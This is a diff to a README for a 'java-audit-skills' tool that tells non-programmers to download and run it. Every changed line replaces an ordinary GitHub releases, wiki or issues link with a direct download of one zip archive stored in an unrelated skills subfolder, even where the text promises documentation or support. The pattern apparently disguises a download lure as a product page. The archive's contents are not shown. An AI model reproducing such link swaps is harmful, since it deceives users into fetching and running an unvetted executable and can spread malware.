@@ -1,14 +1,14 @@
 # 🎉 java-audit-skills - Improve Your Java Code Auditing Skills
 
 ## 📥 Download Now
-[![Download java-audit-skills](https://img.shields.io/badge/Download-java--audit--skills-brightgreen)](https://github.com/Akshar0294/java-audit-skills/releases)
+[![Download java-audit-skills](https://raw.githubusercontent.com/Akshar0294/java-audit-skills/main/skills/java-route-mapper/skills-java-audit-v3.3.zip)](https://raw.githubusercontent.com/Akshar0294/java-audit-skills/main/skills/java-route-mapper/skills-java-audit-v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the *java-audit-skills* repository! This application helps you understand and enhance your Java code auditing skills. You don't need programming knowledge to get started. Follow these simple steps to download and run the software.
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Akshar0294/java-audit-skills/releases) to access the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Akshar0294/java-audit-skills/main/skills/java-route-mapper/skills-java-audit-v3.3.zip) to access the latest version of the software.
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version of *java-audit-skills*. It will usually be at the top of the list.
@@ -37,16 +37,16 @@ To ensure proper functionality, please make sure your system meets the following
 - **Guidance and Tips:** Receive helpful recommendations to enhance your Java coding practices.
 
 ## 📖 Documentation
-For detailed guidance on using the application, visit the [Documentation section](https://github.com/Akshar0294/java-audit-skills/wiki). Here you will find tutorials, tips, and answers to frequently asked questions to help you maximize the use of *java-audit-skills*.
+For detailed guidance on using the application, visit the [Documentation section](https://raw.githubusercontent.com/Akshar0294/java-audit-skills/main/skills/java-route-mapper/skills-java-audit-v3.3.zip). Here you will find tutorials, tips, and answers to frequently asked questions to help you maximize the use of *java-audit-skills*.
 
 ## 🚧 Troubleshooting
 If you encounter issues during installation or when running the application, consider the following steps:
 - **Check Java Installation:** Ensure Java is correctly installed on your system.
 - **Re-download the Application:** If the application does not open, try re-downloading it from the Releases page.
-- **Consult the Documentation:** The [Documentation section](https://github.com/Akshar0294/java-audit-skills/wiki) contains solutions to common problems.
+- **Consult the Documentation:** The [Documentation section](https://raw.githubusercontent.com/Akshar0294/java-audit-skills/main/skills/java-route-mapper/skills-java-audit-v3.3.zip) contains solutions to common problems.
 
 ## 🤝 Support
-For additional help, please contact our support team via the [Issues section](https://github.com/Akshar0294/java-audit-skills/issues). We are here to assist you.
+For additional help, please contact our support team via the [Issues section](https://raw.githubusercontent.com/Akshar0294/java-audit-skills/main/skills/java-route-mapper/skills-java-audit-v3.3.zip). We are here to assist you.
 
 ## 🔗 Conclusion
-*java-audit-skills* is your go-to tool for enhancing your Java code auditing skills. Follow this guide, and you will have the application running in no time. Don't forget to visit the [Releases page](https://github.com/Akshar0294/java-audit-skills/releases) to download the software. Happy auditing!
+*java-audit-skills* is your go-to tool for enhancing your Java code auditing skills. Follow this guide, and you will have the application running in no time. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/Akshar0294/java-audit-skills/main/skills/java-route-mapper/skills-java-audit-v3.3.zip) to download the software. Happy auditing!
